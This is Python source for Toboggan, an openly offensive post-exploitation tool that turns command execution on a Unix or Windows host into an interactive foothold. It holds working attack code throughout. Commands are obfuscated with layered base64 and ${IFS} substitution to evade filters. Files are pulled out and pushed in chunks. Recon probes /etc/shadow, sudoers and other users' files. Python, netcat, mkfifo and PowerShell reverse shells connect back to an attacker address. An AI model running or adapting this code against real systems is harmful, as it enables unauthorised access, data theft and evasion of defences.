# Built-in imports
import base64
import gzip
import time
import re
from abc import ABC, abstractmethod

# Third party library imports
from tqdm import tqdm

# Local library imports
from toboggan.src import utils


class OSHandler(ABC):
    """Interface for handling OS-specific operations."""

    def __init__(self, execute_method) -> None:
        self._execute = execute_method
        self._user = ""
        self._hostname = ""
        self._pwd = ""
        self._system_info = ""

    # Public methods
    def fetch_initial_details(self) -> None:
        """Fetch and display initial details of the remote system.

        This method fetches basic details about the OS, user, current directory, and system, and then displays them.
        Additionally, it calculates and displays the average response time for the command executions.
        """
        total_time = 0
        # Number of _execute function calls
        num_commands = 4

        start_time = time.time()
        self._user = self._execute("whoami").strip()
        total_time += (time.time() - start_time) * 1000  # Convert time to milliseconds
        print(f"[Toboggan] Identified as: {self._user}")

        start_time = time.time()
        self._hostname = self._execute("hostname").strip()
        total_time += (time.time() - start_time) * 1000
        print(f"[Toboggan] Hostname: {self._hostname}")

        start_time = time.time()
        self._pwd = self._get_pwd()
        total_time += (time.time() - start_time) * 1000
        print(f"[Toboggan] Remote working directory: {self._pwd}")

        start_time = time.time()
        self._system_info = self._get_short_system_info().strip()
        total_time += (time.time() - start_time) * 1000
        print(f"[Toboggan] System Information: {self._system_info}")

        response_time = total_time / num_commands
        print(f"[Toboggan] Average response time: {response_time:.2f} ms")

        self._handle_os_specific_cases()

    @abstractmethod
    def prepare_command(self, command: str) -> str:
        pass

    @abstractmethod
    def unobfuscate_result(self, result: str) -> str:
        pass

    @abstractmethod
    def get_encoded_file(self, remote_path: str, chunk_size: int = None) -> None:
        pass

    @abstractmethod
    def upload_file(
        self, file_content: bytes, remote_path: str, chunk_size: int = None
    ) -> None:
        pass

    @abstractmethod
    def reverse_shell(self, ip_addr: str, port: int = None) -> str:
        pass

    # Protected methods
    @abstractmethod
    def _handle_os_specific_cases(self) -> None:
        pass

    @abstractmethod
    def _get_pwd(self) -> str:
        pass

    @abstractmethod
    def _get_short_system_info(self) -> str:
        pass

    # Properties
    @property
    def pwd(self) -> str:
        return self._pwd

    @property
    def user(self) -> str:
        return self._user

    @property
    def hostname(self) -> str:
        return self._hostname

    @property
    def system_info(self) -> str:
        return self._system_info


# Concrete implementation for Unix OS
class UnixHandler(OSHandler):
    def prepare_command(self, command: str) -> str:
        # Verify if the user tries to control the redirection
        if re.search(r"(1?>>?|2?>>?|>>?|[0-9]+>&[0-9]+)", command) is None:
            command += " 2>&1"

        # Base64 the command
        base64_command = base64.b64encode(command.encode(encoding="utf-8")).decode(
            encoding="utf-8"
        )

        # Reverse the encoded string
        reversed_command = base64_command[::-1]

        # base64 encode the reversed string
        base64_reversed_command = base64.b64encode(
            reversed_command.encode(encoding="utf-8")
        ).decode(encoding="utf-8")

        # Take the reversed base64 command, decode it, reverse the decoded output,
        # decode it again, execute the result through the default shell, compress
        # the output, encode the compressed data in base64, reverse this encoded string,
        # and finally convert it to a hexadecimal string.
        obfuscated_command = f"echo '{base64_reversed_command}'|base64 -d|rev|base64 -d|$0|gzip|base64 -w0|rev"

        # base64 it
        obfuscated_command = base64.urlsafe_b64encode(
            obfuscated_command.encode(encoding="utf-8")
        ).decode(encoding="utf-8")

        obfuscated_command = f"echo '{obfuscated_command}'|base64 -d|$0"

        # Replacing all the spaces with ${IFS} value, to evade most of the spaces control.
        obfuscated_command = obfuscated_command.replace(" ", "${IFS}")

        # Our command is ready
        return obfuscated_command

    def unobfuscate_result(self, result: str) -> str:
        try:
            # Decode the base64 string
            decoded_result = base64.b64decode(result[::-1])

            # Ungzip the reversed data
            unzipped_result = gzip.decompress(decoded_result)

            # Convert the unzipped data to a string
            output = unzipped_result.decode("utf-8", errors="replace")
            return output
        except Exception as error:
            raise ValueError(
                f"Error decoding received result: {str(error)!r}"
            ) from error

    def get_encoded_file(self, remote_path: str, chunk_size: int = 4096) -> str:
        """
        Attempts to compress, encode, and retrieve a remote file in chunks after verifying its readability.
        The method uses 'test -r' to check file permissions directly and provides feedback based on the check.

        Args:
            remote_path (str): The path to the remote file.
            chunk_size (int, optional): The size of each chunk to be retrieved. Defaults to 4096.

        Returns:
            str: The base64 encoded content of the file if successful, an empty string otherwise.
        """
        # Check if the file is readable by the current user
        can_read = self._execute(
            command=f"test -r {remote_path} && echo 1 || echo 0"
        ).strip()

        if can_read != "1":
            file_owner = self._execute(
                command=f"stat -c '%U' {remote_path} 2>/dev/null"
            ).strip()
            print(
                f"[Toboggan] No read permission for {remote_path}. File belongs to '{file_owner}'"
            )
            return ""

        print(f"[Toboggan] File is accessible: {remote_path}")

        remote_base64_path = f"{remote_path}_b64"

        # Compress and encode the remote file
        self._execute(
            command=f"gzip -c {remote_path} | base64 -w0 > {remote_base64_path}"
        )

        # Calculate total size of the base64 encoded file
        total_encoded_size = int(
            self._execute(command=f"wc -c < {remote_base64_path}").strip()
        )
        total_chunks = (total_encoded_size + chunk_size - 1) // chunk_size

        encoded_file_content = ""
        print("[Toboggan] Starting to download the file in chunks...")

        for idx in range(total_chunks):
            offset = idx * chunk_size
            chunk = self._execute(
                command=f"dd if={remote_base64_path} bs=1 skip={offset} count={chunk_size} 2>/dev/null"
            )
            encoded_file_content += chunk
            print(f"[Toboggan] Downloaded chunk {idx + 1}/{total_chunks}")

        # Remove the remote base64 encoded file after processing
        self._execute(command=f"rm -f {remote_base64_path}")

        print("[Toboggan] File download completed.")
        return encoded_file_content

    def upload_file(
        self, file_content: bytes, remote_path: str, chunk_size: int = None
    ) -> None:
        # Encode compressed file in base64
        encoded = base64.b64encode(gzip.compress(file_content)).decode(encoding="utf-8")

        # Prepare paths
        remote_base64_path = remote_path + "_b64"

        try:
            # Send encoded file in chunks
            for chunk in tqdm(
                [
                    encoded[i : i + chunk_size]
                    for i in range(0, len(encoded), chunk_size)
                ],
                unit="chunk",
                desc="[Toboggan] Uploading",
            ):
                self._execute(f"/bin/echo '{chunk}' >> {remote_base64_path}")
        except KeyboardInterrupt:
            print("[Toboggan] Upload cancelled.")
        else:
            self._execute(
                f"/usr/bin/base64 -d {remote_base64_path}|gunzip > {remote_path}"
            )
        finally:
            self._execute(f"rm -f {remote_base64_path}")

    def reverse_shell(self, ip_addr: str, port: int = 443, shell: str = None) -> str:
        shell = shell or "/bin/bash"
        if self._execute("command -v python3").strip():
            self._execute(
                f"""python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{ip_addr}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("{shell}")'""",
                timeout=2,
                retry=False,
            )
            print("[Toboggan] python revershell sent.")
        elif self._execute("command -v nc").strip():
            if self._execute("command -v mkfifo").strip():
                self._execute(
                    f"rm /dev/shm/1;mkfifo /dev/shm/1;cat /dev/shm/1|{shell} -i 2>&1|nc {ip_addr} {port} >/dev/shm/1",
                    timeout=2,
                    retry=False,
                )
                print("[Toboggan] mkfifo revershell sent.")
            else:
                self._execute(
                    f"/bin/busybox nc {ip_addr} {port} -e {shell}",
                    timeout=2,
                    retry=False,
                )
                print("[Toboggan] nc reverse shell sent.")
        else:
            print("[Toboggan] No possible reverse shell methods found.")

    # Protected methods
    def _get_pwd(self) -> str:
        return self._execute(command="/bin/pwd").strip()

    def _get_short_system_info(self) -> str:
        return self._execute(command="/bin/uname -a").strip()

    def _handle_os_specific_cases(self) -> None:
        # User information
        print(f"[Toboggan] Identity: {self._execute(command='/usr/bin/id').strip()}")
        self.__analyse_shell_nesting()
        # System-level security mechanisms
        self.__analyse_path_variable()
        self.__analyse_aslr()
        self.__analyse_ptrace_scope()

    # Private methods
    def __analyse_readable_files_other_users(self) -> None:
        """
        Scans for and reports files in other users' home directories that are readable by the current user,
        while suppressing error messages to clean up the output.

        This method leverages the 'find' command to explore the '/home' directory, excluding the current user's
        home directory to focus on others. It lists files that are marked as readable, potentially highlighting improper
        permission settings or sensitive information exposure. Error messages, such as 'Permission denied', are
        suppressed to ensure the output is focused on successfully found readable files.

        Note:
        - Designed for user-level permissions to identify misconfigurations or security risks from a non-privileged standpoint.
        - Error messages are suppressed to clean up the output, focusing on readable files.
        """
        # Execute the command with error output suppression
        command_result = self._execute(
            command='find /home -path "$HOME" -prune -o -readable -type f -print 2>/dev/null'
        ).strip()

        if command_result:
            print("[Toboggan] Readable files have been found in other user land:")

            # Organize files by their parent directories
            directory_map = {}
            for file_path in command_result.split("\n"):
                directory, file_name = file_path.rsplit("/", 1)
                if directory in directory_map:
                    directory_map[directory].append(file_name)
                else:
                    directory_map[directory] = [file_name]

            # Print the organized list
            for directory, files in directory_map.items():
                print(f"\t• {directory}")
                for file_name in files:
                    print(f"\t\t- {file_name}")
        else:
            print("[Toboggan] No readable files found in other user's directories.")

    def __analyse_path_variable(self) -> None:
        raw_path = self._execute(command="/bin/echo $PATH").strip()
        print("[Toboggan] Binary and script searching order (PATH):")
        for index, entry in enumerate(raw_path.split(":"), start=1):
            print(f"\t{index}. {entry}")

    def __analyse_aslr(self) -> None:
        # ASLR mapping
        aslr_mapping = {
            "0": "No randomization. Everything is static.",
            "1": "Shared libraries are randomized.",
            "2": "Shared libraries, stack, mmap(), and VDSO pages are randomized.",
        }

        aslr = self._execute(
            command="/bin/cat /proc/sys/kernel/randomize_va_space"
        ).strip()

        # Retrieve explanation from mapping, or set to "Unknown" if ASLR value isn't recognized
        aslr_explanation = aslr_mapping.get(aslr, "Unknown")
        print(f"[Toboggan] ASLR ({aslr}): {aslr_explanation}")

    def __analyse_ptrace_scope(self) -> None:
        # ptrace_scope mapping
        ptrace_scope_mapping = {
            "0": "No restrictions. ptrace() can be used by any process on any other.",
            "1": "Restricted ptrace(). Only parent processes can use ptrace() on direct child processes.",
            "2": "Admin-only attach. Only admin processes can use ptrace().",
            "3": "No attach. No process may use ptrace().",
        }

        ptrace_scope = self._execute(
            command="/bin/cat /proc/sys/kernel/yama/ptrace_scope"
        ).strip()

        # Retrieve explanation from mapping, or set to "Unknown" if ptrace_scope value isn't recognized
        ptrace_scope_explanation = ptrace_scope_mapping.get(ptrace_scope, "Unknown")
        print(f"[Toboggan] Ptrace Scope ({ptrace_scope}): {ptrace_scope_explanation}")

    def __analyse_shell_nesting(self) -> None:
        shell_lvl = self._execute(command="echo $SHLVL").strip()
        # Check if the command was executed successfully
        if shell_lvl.isdigit():
            shell_lvl = int(shell_lvl)
            print(f"[Toboggan] Shell nesting: {shell_lvl} (SHLVL - SHell LeVeL)")

    def __analyse_no_owners_files(self) -> None:
        if no_owners := self._execute(
            command="find / -nouser -o -nogroup -exec ls -al {} \; 2>/dev/null"
        ).strip():
            print("[Toboggan] Find files without owners:")
            print(no_owners)

    def __analyse_weak_file_permissions(self) -> None:
        """
        Analyzes the file permissions of certain critical files on the system.
        Checks for world-writable or group-writable permissions and evaluates if
        they pose a risk based on the current user's group memberships.
        """

        def check_group_ownership(file: str) -> str:
            """
            Returns the group ownership of a given file.

            Args:
                file (str): Path to the file whose group ownership is to be checked.

            Returns:
                str: Name of the group that owns the file.
            """
            return self._execute(command=f"/usr/bin/stat -c '%G' {file}").strip()

        def current_user_groups() -> set:
            """
            Fetches the list of groups the current user is a part of.

            Returns:
                set: A set containing names of groups the current user belongs to.
            """
            return set(self._execute(command="/usr/bin/id -Gn").strip().split())

        user_groups = current_user_groups()

        def analyze_file(file: str) -> None:
            """
            Analyzes the permissions of a given file. Prints out a warning message
            if the file is world-writable or group-writable and poses a risk.

            Args:
                file (str): Path to the file to be analyzed.
            """
            perms = self._execute(command=f"/usr/bin/stat -c '%A' {file}").strip()
            file_group = check_group_ownership(file)

            if "w" in perms[7]:
                print(f"[Toboggan] Warning: {file} is world-writable!")
            elif "w" in perms[5]:
                if file_group in user_groups:
                    print(
                        f"[Toboggan] Warning: {file} is group-writable and the current user is part of the '{file_group}' group!"
                    )
                else:
                    print(
                        f"[Toboggan] Warning: {file} is group-writable by the '{file_group}' group, but the current user isn't part of it."
                    )
            else:
                print(f"[Toboggan] {file} permissions are appropriately configured.")

        # Checking /etc/shadow permissions
        analyze_file("/etc/shadow")
        # Checking /etc/passwd permissions
        analyze_file("/etc/passwd")
        # Checking for /etc/sudoers
        analyze_file("/etc/sudoers")


# Concrete implementation for Windows OS
class WindowsHandler(OSHandler):
    AES_DECRYPT = r"function B64ToByte($b64){[Convert]::FromBase64String($b64)}$eb=B64ToByte '{ENCRYPTED}';$kb=B64ToByte '{KEY}';$iv=B64ToByte '{IV}';$aes=New-Object Security.Cryptography.AesManaged;$aes.Mode='CBC';$aes.Padding='PKCS7';$aes.BlockSize=128;$aes.KeySize=128;$aes.Key=$kb;$aes.IV=$iv;$d=$aes.CreateDecryptor().TransformFinalBlock($eb,0,$eb.Length);try{&([scriptblock]::Create([Text.Encoding]::UTF8.GetString($d)))}catch{$_}"

    def prepare_command(self, command: str) -> str:
        # encrypted, key, iv = utils.aes_encrypt(command=command)

        # command = (
        #     self.AES_DECRYPT.replace("{ENCRYPTED}", encrypted)
        #     .replace("{KEY}", key)
        #     .replace("{IV}", iv)
        # )

        # # Prepare last command
        # powershell_command = f"powershell -noni -nop -ep bypass -e {utils.base64_for_powershell(command=command)}"

        # # Problem remaining is the CLIXML output
        return command

    def unobfuscate_result(self, result: str) -> str:
        if "contains malicious content" in result:
            print(
                "[Toboggan] A malicious content has been blocked by the antivirus software."
            )
            return

        # Verify if it's CLIXML and retrieve the result inside
        if "CLIXML" in result:
            # Attempt to detect and separate direct output from CLIXML content

            if direct_output_match := re.match(
                r"^#< CLIXML\s*(.*?)\n<Objs", result, re.DOTALL
            ):
                return direct_output_match.group(1)

        return result

    def get_encoded_file(self, remote_path: str, chunk_size: int = None) -> None:
        # Test if file remotely exists
        test_file = self._execute(
            command=f"if (Test-Path {remote_path} -PathType Leaf) {{ Write-Output 'e' }}"
        ).strip()
        if test_file != "e":
            raise FileNotFoundError(f"The remote file {remote_path} does not exist.")

        remote_base64_path = f"{remote_path}_b64.txt"

        # Compress and encode the file once using PowerShell
        compress_script = f"""
            [System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem')
            $bytes = [System.IO.File]::ReadAllBytes("{remote_path}")
            $ms = New-Object System.IO.MemoryStream
            $gzipStream = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Compress)
            $gzipStream.Write($bytes, 0, $bytes.Length)
            $gzipStream.Close()
            $compressedBytes = $ms.ToArray()
            $encodedString = [Convert]::ToBase64String($compressedBytes)
            Set-Content -Path '{remote_base64_path}' -Value $encodedString
        """
        byte_script = compress_script.encode("utf-16-le")
        encoded_script = base64.b64encode(byte_script).decode("utf-8")
        self._execute(command=f"powershell -ep Bypass -e {encoded_script}")

        # Calculate the total size of the base64 encoded file
        total_encoded_size = int(
            self._execute(
                command=f"(Get-Content -Path {remote_base64_path} | Measure-Object -Character).Characters"
            )
        )
        total_chunks = (total_encoded_size + chunk_size - 1) // chunk_size

        # Receive encoded file in chunks
        encoded_file_content = ""
        offset = 0
        for idx in tqdm(
            range(total_chunks), unit="chunk", desc="[Toboggan] Downloading"
        ):
            chunk = self._execute(
                command=f"Get-Content -Path '{remote_base64_path}' -TotalCount {offset + chunk_size} | Select-Object -Skip {offset}"
            ).strip()
            encoded_file_content += chunk
            offset += chunk_size

        # Remove the remote base64 file after processing
        self._execute(f"Remove-Item -Path '{remote_base64_path}' -Force")

        return encoded_file_content

    def upload_file(
        self, file_content: bytes, remote_path: str, chunk_size: int = None
    ) -> None:
        # Encode the file in base64
        encoded = base64.b64encode(file_content).decode(encoding="utf-8")

        # Prepare paths
        remote_base64_path = remote_path + "_b64"

        # Remove existing remote files
        self._execute(f"Remove-Item -Path {remote_path} -ErrorAction Ignore")
        self._execute(f"Remove-Item -Path {remote_base64_path} -ErrorAction Ignore")

        # Send encoded file in chunks
        for chunk in tqdm(
            [encoded[i : i + chunk_size] for i in range(0, len(encoded), chunk_size)],
            unit="chunk",
            desc="[Toboggan] Uploading",
        ):
            self._execute(f"Add-Content -Value '{chunk}' -Path {remote_base64_path}")

        # Decode the base64 file
        decode_script = (
            f"$encodedContent = Get-Content -Path {remote_base64_path} -Raw; "
            f"$decodedContent = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedContent)); "
            f"Set-Content -Path {remote_path} -Value $decodedContent"
        )

        # Convert the script to bytes
        byte_script = decode_script.encode("utf-16-le")

        # Base64 encode the bytes
        encoded_script = base64.b64encode(byte_script).decode("utf-8")

        self._execute(command=f"powershell -e {encoded_script}")

        # Remove the remote base64 file
        self._execute(f"Remove-Item -Path {remote_base64_path}")

    def reverse_shell(self, ip_addr: str, port: int = 443, shell: str = None) -> str:
        if shell.lower() == "powershell":
            revshell_command = f"$client = New-Object System.Net.Sockets.TCPClient('{ip_addr}',{port});"
            revshell_command += "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
            revshell_command += "$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
            revshell_command += "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);"
            revshell_command += "$stream.Flush()};$client.Close()"

            revshell_command = (
                f"powershell -e {utils.base64_for_powershell(revshell_command)}"
            )

        self._execute(revshell_command, timeout=10, retry=False)

    # Protected methods
    def _get_pwd(self) -> str:
        return self._execute(command="(Get-Location).Path").strip()

    def _get_short_system_info(self) -> str:
        # Define the keys of interest
        keys_of_interest = [
            "OS Version",
            "OS Manufacturer",
            "OS Configuration",
        ]

        # Dictionary to hold our extracted values
        extracted_values = {}

        # Iterate through each line of the system info output
        for line in self._execute(command="systeminfo").strip().splitlines():
            # Check if the line contains any of the keys of interest
            for key in keys_of_interest:
                if line.startswith(key):
                    # Extract the value after the colon and strip it of leading/trailing whitespace
                    value = line.split(":", 1)[1].strip()
                    extracted_values[key] = value.replace(" N/A", "")
                    break

        # Concatenate the extracted values into a single string
        short_system_info = " ".join(extracted_values.values())

        return short_system_info

    def _handle_os_specific_cases(self) -> None:

        # Check the CLM level
        if result := self._execute(
            command=r"$ExecutionContext.SessionState.LanguageMode"
        ):
            print(f"[Toboggan] Powershell language mode: {result}")

        self.__check_domain_join()
        if result := self._execute(
            command=r'"$($PSVersionTable.PSVersion.Major).$($PSVersionTable.PSVersion.Minor).$($PSVersionTable.PSVersion.Build).$($PSVersionTable.PSVersion.Revision)"'
        ).strip():
            print(f"[Toboggan] PowerShell version: {result}")

        # System-level security mechanisms
        self.__analyse_path_variable()

    def __analyse_path_variable(self) -> None:
        raw_path = self._execute(command="$env:PATH").strip()
        print("[Toboggan] Binary and script searching order (PATH):")
        for index, entry in enumerate(raw_path.split(";"), start=1):
            print(f"\t{index}. {entry}")

    def __check_domain_join(self) -> None:
        # Use regular expression to extract the domain from systeminfo output
        if domain_match := re.search(
            r"Domain:\s*(.*)", self._execute(command="systeminfo").strip()
        ):
            print(f"[Toboggan] Domain is: {domain_match.group(1).strip()}")
